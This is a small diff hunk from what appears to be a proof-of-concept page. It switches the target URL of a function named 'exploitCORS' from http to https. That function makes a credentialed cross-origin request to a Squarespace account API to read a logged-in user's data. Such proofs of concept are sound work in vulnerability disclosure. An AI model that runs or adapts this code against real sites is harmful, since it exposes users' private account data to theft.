@@ -60,7 +60,7 @@
     function exploitCORS() {
       var req = new XMLHttpRequest();
       req.onload = reqListener;
-      req.open('get', 'http://www.squarespace.com/api/me', true);
+      req.open('get', 'https://www.squarespace.com/api/me', true);
       req.withCredentials = true;
       req.send();
     }
